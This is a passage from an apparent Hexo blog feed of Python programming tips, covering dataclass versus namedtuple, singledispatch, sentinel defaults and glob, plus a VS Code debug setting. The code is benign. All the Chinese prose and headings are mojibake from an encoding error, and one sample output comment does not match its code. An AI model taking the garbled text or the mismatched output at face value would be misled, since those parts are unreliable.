class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1024</span>,</span><span class="line">        encircle <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">2048</span>,</span><span class="line">        overline <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">4096</span>,</span><span class="line">    )</span><span class="line">)</span><span class="line">self._attributes = (</span><span class="line">    <span class="hljs-built_in">sum</span>(</span><span class="line">        (</span><span class="line">            bold <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            dim <span class="hljs-keyword">and</span> <span class="hljs-number">2</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            italic <span class="hljs-keyword">and</span> <span class="hljs-number">4</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            underline <span class="hljs-keyword">and</span> <span class="hljs-number">8</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            blink <span class="hljs-keyword">and</span> <span class="hljs-number">16</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            blink2 <span class="hljs-keyword">and</span> <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            reverse <span class="hljs-keyword">and</span> <span class="hljs-number">64</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            conceal <span class="hljs-keyword">and</span> <span class="hljs-number">128</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            strike <span class="hljs-keyword">and</span> <span class="hljs-number">256</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            underline2 <span class="hljs-keyword">and</span> <span class="hljs-number">512</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            frame <span class="hljs-keyword">and</span> <span class="hljs-number">1024</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            encircle <span class="hljs-keyword">and</span> <span class="hljs-number">2048</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">            overline <span class="hljs-keyword">and</span> <span class="hljs-number">4096</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>,</span><span class="line">        )</span><span class="line">    )</span></code></pre></div></div><h2 id="çµæ´»è¿ç”¨or"><a href="#çµæ´»è¿ç”¨or" class="headerlink" title="çµæ´»è¿ç”¨or"></a>çµæ´»è¿ç”¨or</h2><p>çµæ´»è¿ç”¨orå¯ä»¥åšåˆ°å‚æ•°é‡Œé¢</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">render_options = render_options.update_dimensions(</span><span class="line">               render_options.max_width, render_options.height <span class="hljs-keyword">or</span> self.height</span><span class="line">           )</span></code></pre></div></div><h2 id="ä½¿ç”¨è‡ªå®šä¹‰ç±»æ¥åˆ¤æ–­æ˜¯å¦å†™äº†å‚æ•°"><a href="#ä½¿ç”¨è‡ªå®šä¹‰ç±»æ¥åˆ¤æ–­æ˜¯å¦å†™äº†å‚æ•°" class="headerlink" title="ä½¿ç”¨è‡ªå®šä¹‰ç±»æ¥åˆ¤æ–­æ˜¯å¦å†™äº†å‚æ•°"></a>ä½¿ç”¨è‡ªå®šä¹‰ç±»æ¥åˆ¤æ–­æ˜¯å¦å†™äº†å‚æ•°</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NoChange</span>:</span></span><span class="line"><span class="hljs-keyword">pass</span></span><span class="line"></br></span><span class="line">NO_CHANGE = NoChange()</span><span class="line"></br></span><span class="line"> </br></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        self,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        *,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        width: <span class="hljs-type">Union</span>[<span class="hljs-built_in">int</span>, NoChange] = NO_CHANGE,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        min_width: <span class="hljs-type">Union</span>[<span class="hljs-built_in">int</span>, NoChange] = NO_CHANGE</span></span></span><span class="line"></br>):</span></span><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(width, NoChange):</span><span class="line">        options.min_width = options.max_width = <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, width)</span><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(min_width, NoChange):</span><span class="line">        options.min_width = min_width</span></code></pre></div></div><h2 id="å•è¡Œ-ifâ€¦else"><a href="#å•è¡Œ-ifâ€¦else" class="headerlink" title="å•è¡Œ ifâ€¦else"></a>å•è¡Œ ifâ€¦else</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> <span class="hljs-keyword">else</span> <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;b&#x27;</span>)</span></code></pre></div></div><p>or </p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;a&#x27;</span></span><span class="line">      <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span></span><span class="line">      <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;b&#x27;</span>)</span></code></pre></div></div><p>é…åˆ for å¾ªç¯</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">_layouts = [</span><span class="line">    layout <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(layout, Layout) <span class="hljs-keyword">else</span> Layout(layout)</span><span class="line">    <span class="hljs-keyword">for</span> layout <span class="hljs-keyword">in</span> layouts</span><span class="line">]</span></code></pre></div></div><h2 id="lambda-ä½œä¸ºå‚æ•°"><a href="#lambda-ä½œä¸ºå‚æ•°" class="headerlink" title="lambda ä½œä¸ºå‚æ•°"></a>lambda ä½œä¸ºå‚æ•°</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Callable</span></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_lambda</span>(<span class="hljs-params">code: <span class="hljs-type">Callable</span></span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(code))</span><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(code, <span class="hljs-type">Callable</span>):</span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;code is callable&quot;</span>)</span><span class="line">        <span class="hljs-built_in">print</span>(code())</span><span class="line"></br></span><span class="line">code = <span class="hljs-number">1</span></span><span class="line"></br></span><span class="line">test_lambda(code=<span class="hljs-keyword">lambda</span>: <span class="hljs-built_in">str</span>(code <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&#x27;</span>))</span><span class="line"></br></span><span class="line"><span class="hljs-comment">## output:</span></span><span class="line"><span class="hljs-comment">#&lt;class &#x27;function&#x27;&gt;</span></span><span class="line"><span class="hljs-comment">#str is callable</span></span><span class="line"><span class="hljs-comment">#1</span></span></code></pre></div></div><h2 id="print-ä¸­çš„-r"><a href="#print-ä¸­çš„-r" class="headerlink" title="print ä¸­çš„!r"></a>print ä¸­çš„<code>!r</code></h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">pwd=<span class="hljs-string">&#x27;123456&#x27;</span></span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;password=<span class="hljs-subst">&#123;pwd!r&#125;</span>&quot;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment">## output:</span></span><span class="line"><span class="hljs-comment">#password=&#x27;123456&#x27;</span></span></code></pre></div></div><p>ä¼šå°†å†…å®¹ç”¨å¼•å·åŒ…æ‹¬ä½</p><h2 id="å¤šä¸ª-contentmanager-ä¸€èµ·å†™"><a href="#å¤šä¸ª-contentmanager-ä¸€èµ·å†™" class="headerlink" title="å¤šä¸ª contentmanager ä¸€èµ·å†™"></a>å¤šä¸ª contentmanager ä¸€èµ·å†™</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">with</span> Popen(<span class="hljs-string">&quot;command&quot;</span>, stdout=PIPE, stderr=STDOUT, bufsize=<span class="hljs-number">1</span>) <span class="hljs-keyword">as</span> p, \</span><span class="line">     <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;logfile&#x27;</span>, <span class="hljs-string">&#x27;ab&#x27;</span>) <span class="hljs-keyword">as</span> file:</span><span class="line">    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> p.stdout: <span class="hljs-comment"># b&#x27;\n&#x27;-separated lines</span></span><span class="line">        sys.stdout.buffer.write(line) <span class="hljs-comment"># pass bytes as is</span></span><span class="line">        file.write(line)</span></code></pre></div></div><h2 id="ä½¿ç”¨-file-å®šä½ç¨‹åºçš„è·¯å¾„"><a href="#ä½¿ç”¨-file-å®šä½ç¨‹åºçš„è·¯å¾„" class="headerlink" title="ä½¿ç”¨__file__å®šä½ç¨‹åºçš„è·¯å¾„"></a>ä½¿ç”¨<code>__file__</code>å®šä½ç¨‹åºçš„è·¯å¾„</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> os</span><span class="line"><span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> __file__ <span class="hljs-keyword">as</span> module_file</span><span class="line"></br></span><span class="line">self.root_path = os.path.dirname(module_file)</span></code></pre></div></div><h2 id="æ­£åˆ™è¡¨è¾¾å¼çš„æ‰©å±•"><a href="#æ­£åˆ™è¡¨è¾¾å¼çš„æ‰©å±•" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼çš„æ‰©å±•"></a>æ­£åˆ™è¡¨è¾¾å¼çš„æ‰©å±•</h2><p>å¸Œæœ›é€å­—åŒ¹é…çš„æ—¶å€™ã€‚</p><p>å½“é‡åˆ°<code>show version</code>çš„æ—¶å€™ï¼Œéœ€è¦åŒ¹é…<code>sh[[ow]] ver[[sion]]</code>è¿™æ ·å†™</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_PreParse</span>(<span class="hljs-params">self, key, value</span>):</span></span><span class="line"><span class="hljs-string">&quot;&quot;&quot;Executed against each field of each row read from index table.&quot;&quot;&quot;</span></span><span class="line"><span class="hljs-keyword">if</span> key == <span class="hljs-string">&#x27;Command&#x27;</span>:</span><span class="line">    <span class="hljs-keyword">return</span> re.sub(<span class="hljs-string">r&#x27;(\[\[.+?\]\])&#x27;</span>, self._Completion, value)</span><span class="line"><span class="hljs-keyword">else</span>:</span><span class="line">    <span class="hljs-keyword">return</span> value</span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_Completion</span>(<span class="hljs-params">self, match</span>):</span></span><span class="line"><span class="hljs-string">r&quot;&quot;&quot;Replaces double square brackets with variable length completion.</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">Completion cannot be mixed with regexp matching or &#x27;\&#x27; characters</span></span><span class="line"><span class="hljs-string">i.e. &#x27;[[(\n)]] would become (\(n)?)?.&#x27;</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">Args:</span></span><span class="line"><span class="hljs-string">    match: A regex Match() object.</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">Returns:</span></span><span class="line"><span class="hljs-string">    String of the format &#x27;(a(b(c(d)?)?)?)?&#x27;.</span></span><span class="line"><span class="hljs-string">&quot;&quot;&quot;</span></span><span class="line"><span class="hljs-comment"># Strip the outer &#x27;[[&#x27; &amp; &#x27;]]&#x27; and replace with ()? regexp pattern.</span></span><span class="line">word = <span class="hljs-built_in">str</span>(match.group())[<span class="hljs-number">2</span>:-<span class="hljs-number">2</span>]</span><span class="line"><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;(&#x27;</span> + (<span class="hljs-string">&#x27;(&#x27;</span>).join(word) + <span class="hljs-string">&#x27;)?&#x27;</span> * <span class="hljs-built_in">len</span>(word)</span></code></pre></div></div><h2 id="å¤šç³»ç»Ÿè·¯å¾„åˆ†å‰²æ–¹æ³•"><a href="#å¤šç³»ç»Ÿè·¯å¾„åˆ†å‰²æ–¹æ³•" class="headerlink" title="å¤šç³»ç»Ÿè·¯å¾„åˆ†å‰²æ–¹æ³•"></a>å¤šç³»ç»Ÿè·¯å¾„åˆ†å‰²æ–¹æ³•</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> os</span><span class="line">path = os.path.normpath(path)</span><span class="line">path.split(os.sep)</span></code></pre></div></div><h2 id="éå†æ–‡ä»¶ï¼Œè¿”å›åˆ—è¡¨"><a href="#éå†æ–‡ä»¶ï¼Œè¿”å›åˆ—è¡¨" class="headerlink" title="éå†æ–‡ä»¶ï¼Œè¿”å›åˆ—è¡¨"></a>éå†æ–‡ä»¶ï¼Œè¿”å›åˆ—è¡¨</h2><p>ä¹‹å‰æˆ‘ç”¨çš„éƒ½æ˜¯<code>os.walk</code>ï¼Œå…¶å®è¿˜æœ‰ä¸€ç§æ–¹å¼ï¼Œä½¿ç”¨<code>glob</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> glob</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> glob.iglob(<span class="hljs-string">&quot;&#123;0&#125;/*.yml&quot;</span>.<span class="hljs-built_in">format</span>(dirpath)):</span><span class="line">    <span class="hljs-built_in">print</span>(file)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># or</span></span><span class="line"></br></span><span class="line">glob.glob(<span class="hljs-string">&quot;&#123;0&#125;/*.yml&quot;</span>.<span class="hljs-built_in">format</span>(dirpath))</span></code></pre></div></div><h2 id="contextmanager-è·³è¿‡ä»£ç å—"><a href="#contextmanager-è·³è¿‡ä»£ç å—" class="headerlink" title="contextmanager è·³è¿‡ä»£ç å—"></a>contextmanager è·³è¿‡ä»£ç å—</h2><ul><li><p>å‚è€ƒ<a href="https://stackoverflow.com/questions/12594148/skipping-execution-of-with-block">è¿™ç¯‡æ–‡ç« </a></p></li><li><p><a href="/2022/08/24/python-with-%E4%BB%A3%E7%A0%81%E5%9D%97%E8%B7%B3%E8%BF%87/" title="python -with- ä»£ç å—è·³è¿‡">python -with- ä»£ç å—è·³è¿‡</a></p></li></ul><h2 id="å•ä¾‹ç±»"><a href="#å•ä¾‹ç±»" class="headerlink" title="å•ä¾‹ç±»"></a>å•ä¾‹ç±»</h2><p>ç”¨ç±»ç»§æ‰¿ä¼šå¥½äº›</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Singleton</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span></span><span class="line">  _instance = <span class="hljs-literal">None</span></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__new__</span>(<span class="hljs-params">class_, *args, **kwargs</span>):</span></span><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(class_._instance, class_):</span><span class="line">        class_._instance = <span class="hljs-built_in">object</span>.__new__(class_, *args, **kwargs)</span><span class="line">    <span class="hljs-keyword">return</span> class_._instance</span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OtherClass</span>(<span class="hljs-params">Singleton</span>):</span></span><span class="line">    ...</span></code></pre></div></div><h2 id="å¤šç±»å‹å‚æ•°"><a href="#å¤šç±»å‹å‚æ•°" class="headerlink" title="å¤šç±»å‹å‚æ•°"></a>å¤šç±»å‹å‚æ•°</h2><p>ä½¿ç”¨functoolsæ¨¡å—é‡Œé¢çš„singledispatchè£…é¥°å™¨å®ç°å‡½æ•°é‡è½½</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> singledispatch</span><span class="line"></br></span><span class="line"><span class="hljs-meta">@singledispatch</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connect</span>(<span class="hljs-params">address</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ç±»å‹ä¸æ”¯æŒ&#x27;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-meta">@connect.register</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_</span>(<span class="hljs-params">address: <span class="hljs-built_in">str</span></span>):</span></span><span class="line">    ip, port = address.split(<span class="hljs-string">&#x27;:&#x27;</span>)</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;å‚æ•°ç±»å‹ä¸ºstring è¿æ¥åˆ°&#123;&#125;:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip, port))</span><span class="line"></br></span><span class="line"><span class="hljs-meta">@connect.register</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_</span>(<span class="hljs-params">address: <span class="hljs-built_in">tuple</span></span>):</span></span><span class="line">    ip, port = address</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;å‚æ•°ç±»å‹ä¸ºtuple è¿æ¥åˆ°&#123;&#125;:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip, port))</span><span class="line"></br></span><span class="line">connect(<span class="hljs-number">123</span>)</span><span class="line">connect(<span class="hljs-string">&#x27;192.168.1.1:123&#x27;</span>)</span><span class="line">connect((<span class="hljs-string">&#x27;192.168.1.1&#x27;</span>, <span class="hljs-number">123</span>))</span><span class="line"></br></span><span class="line"><span class="hljs-comment">## output</span></span><span class="line"><span class="hljs-comment"># ç±»å‹ä¸æ”¯æŒ</span></span><span class="line"><span class="hljs-comment"># å‚æ•°ç±»å‹ä¸ºstring è¿æ¥åˆ°192.168.1.1:123</span></span><span class="line"><span class="hljs-comment"># å‚æ•°ç±»å‹ä¸ºtuple è¿æ¥åˆ°192.168.1.1:123</span></span></code></pre></div></div><h2 id="dataclass-ä½¿ç”¨dict"><a href="#dataclass-ä½¿ç”¨dict" class="headerlink" title="dataclass ä½¿ç”¨dict"></a>dataclass ä½¿ç”¨dict</h2><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œdataclassä¸­æ˜¯èƒ½æœ‰dictè¿™ç§iterç±»çš„ï¼Œä½†æ˜¯å¯ä»¥åŠ å…¥<code>field</code>æ¥è§£å†³</p><ul><li><a href="https://stackoverflow.com/questions/72630488/valueerror-mutable-default-class-dict-for-field-headers-is-not-allowed-use">å‚è€ƒ</a></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass, field</span><span class="line"></br></span><span class="line"><span class="hljs-meta">@dataclass</span></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span>:</span></span><span class="line">    headers: <span class="hljs-built_in">dict</span> = field(default_factory=<span class="hljs-keyword">lambda</span>: &#123;&#125;)</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> todo </tag>
            
            <tag> python </tag>
            
            <tag> æ”¶é›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python dataclass ä¸ namedtuple</title>
      <link href="/2022/03/10/python-dataclass-%E4%B8%8E-namedtuple/"/>
      <url>/2022/03/10/python-dataclass-%E4%B8%8E-namedtuple/</url>
      
        <content type="html"><![CDATA[<p><code>dataclass</code> ä¸ <code>namedtuple</code>éƒ½æ˜¯pythoné‡è¦çš„æ•°æ®ç»“æ„</p><h2 id="ä¸ºä»€ä¹ˆè¦ç”¨åˆ°è¿™ä¸¤ä¸ªæ•°æ®ç»“æ„"><a href="#ä¸ºä»€ä¹ˆè¦ç”¨åˆ°è¿™ä¸¤ä¸ªæ•°æ®ç»“æ„" class="headerlink" title="ä¸ºä»€ä¹ˆè¦ç”¨åˆ°è¿™ä¸¤ä¸ªæ•°æ®ç»“æ„"></a>ä¸ºä»€ä¹ˆè¦ç”¨åˆ°è¿™ä¸¤ä¸ªæ•°æ®ç»“æ„</h2><ol><li>å¦‚æœåªæ˜¯ç®€å•çš„è¿”å›<code>return (&#39;name&#39;, 30)</code> è¿™æ ·çš„è¯ï¼Œå°±æ— æ³•ç¡®ä¿è¿”å›å€¼è¢«å‡†ç¡®çš„è°ƒç”¨</li><li>å¦‚æœä½¿ç”¨<code>return &#123;&#39;name&#39;: &#39;Elin&#39;, &#39;age&#39;: 30&#125;</code> è¿™æ ·çš„è¯æ— æ³•ä½¿ç”¨æ•£åˆ—ï¼Œå¹¶ä¸”éœ€è¦è·Ÿè¸ªkeyåç§°ã€‚å¦å¤–dictæ˜¯å¯å˜çš„ã€‚</li></ol><h2 id="dataclass-å’Œ-namedtuple-çš„å·®åˆ«"><a href="#dataclass-å’Œ-namedtuple-çš„å·®åˆ«" class="headerlink" title="dataclass å’Œ namedtuple çš„å·®åˆ«"></a><code>dataclass</code> å’Œ <code>namedtuple</code> çš„å·®åˆ«</h2><p>åŒæ ·ä½¿æ•°æ®ç»“æ„ï¼Œä½†æ˜¯ä¸¤ä¸ªæœ‰ä¸€äº›å·®åˆ«ã€‚</p><p><code>dataclass</code>:</p><ul><li>å¯ä»¥è®¾ç½®é»˜è®¤å€¼</li><li>å®šä¹‰<code>__post_init__</code>æ–¹æ³•æ¥å»¶è¿Ÿåˆå§‹åŒ–ä¸€äº›é»˜è®¤å€¼</li><li>é»˜è®¤ä¸æ”¯æŒhashï¼Œéœ€è¦å…³é—­<code>unsafe_hash</code>å‚æ•°</li><li>ç”Ÿæˆåå¯ä»¥ä¿®æ”¹å€¼</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-meta">@dataclass</span></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>:</span></span><span class="line">    name: <span class="hljs-built_in">str</span></span><span class="line">    age: <span class="hljs-built_in">int</span></span><span class="line">    title: <span class="hljs-built_in">str</span> = <span class="hljs-literal">None</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__post_init__</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        self.title = <span class="hljs-string">f&quot;Hello <span class="hljs-subst">&#123;self.name&#125;</span>&quot;</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">welcome</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Welcome <span class="hljs-subst">&#123;self.name&#125;</span>&quot;</span></span><span class="line"></br></span><span class="line"></br></span><span class="line">p1 = Person(<span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-number">30</span>)</span><span class="line"><span class="hljs-built_in">print</span>(p1.title)</span><span class="line"><span class="hljs-comment"># Hello John</span></span><span class="line"><span class="hljs-built_in">print</span>(p1.welcome())</span><span class="line"><span class="hljs-comment"># Welcome John</span></span></code></pre></div></div><p><code>namedtuple</code>:</p><ul><li>ä¸èƒ½è®¾ç½®é»˜è®¤å€¼</li><li>ç”Ÿæˆåä¸èƒ½ä¿®æ”¹å€¼</li><li>ä½¿ç”¨<code>typing.NamedTuple</code>è‡ªå®šä¹‰ç±»</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> namedtuple</span><span class="line"></br></span><span class="line">Person = namedtuple(<span class="hljs-string">&#x27;PersonA&#x27;</span>, <span class="hljs-string">&#x27;name age&#x27;</span>)</span><span class="line"></br></span><span class="line">p1 = Person(name=<span class="hljs-string">&#x27;John&#x27;</span>, age=<span class="hljs-number">30</span>)</span><span class="line"><span class="hljs-built_in">print</span>(p1.name)</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> NamedTuple</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>(<span class="hljs-params">NamedTuple</span>):</span></span><span class="line">    name: <span class="hljs-built_in">str</span></span><span class="line">    age: <span class="hljs-built_in">int</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">welcome</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;welcome <span class="hljs-subst">&#123;self.name&#125;</span>&quot;</span></span><span class="line"></br></span><span class="line"></br></span><span class="line">p1 = Person(name=<span class="hljs-string">&#x27;John&#x27;</span>, age=<span class="hljs-number">30</span>)</span><span class="line"><span class="hljs-built_in">print</span>(p1.welcome())</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode Debug justMyCode</title>
      <link href="/2022/03/07/vscode-Debug-justMyCode/"/>
      <url>/2022/03/07/vscode-Debug-justMyCode/</url>
      
        <content type="html"><![CDATA[<p>åœ¨debugå’Œpytest debugä¸­æ·»åŠ  <code>justMyCode</code> é€‰é¡¹</p><ul><li>å‚è€ƒè¿™ä¸ª<a href="https://github.com/microsoft/vscode-python/issues/7083">issue</a></li></ul><div class="codeBlockContainer"><div class="codeBlockTitle">.vscode/launch.json</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-json codeBlockLines"><span class="line">&#123;</span><span class="line">    <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Python: å½“å‰æ–‡ä»¶&quot;</span>,</span><span class="line">    <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;python&quot;</span>,</span><span class="line">    <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,</span><span class="line">    <span class="hljs-attr">&quot;program&quot;</span>: <span class="hljs-string">&quot;$&#123;file&#125;&quot;</span>,</span><span class="line">    <span class="hljs-attr">&quot;console&quot;</span>: <span class="hljs-string">&quot;integratedTerminal&quot;</span>,</span><span class="line marked">    <span class="hljs-attr">&quot;justMyCode&quot;</span>: <span class="hljs-literal">false</span></span><span class="line">&#125;,</span><span class="line marked">&#123;</span><span class="line marked">    <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Debug Pytest&quot;</span>,</span><span class="line marked">    <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;python&quot;</span>,</span><span class="line marked">    <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,</span><span class="line marked">    <span class="hljs-attr">&quot;justMyCode&quot;</span>: <span class="hljs-literal">false</span></span><span class="line marked">&#125;</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·æ”¶é›†</title>
      <link href="/2022/03/03/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"/>
      <url>/2022/03/03/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/</url>
      
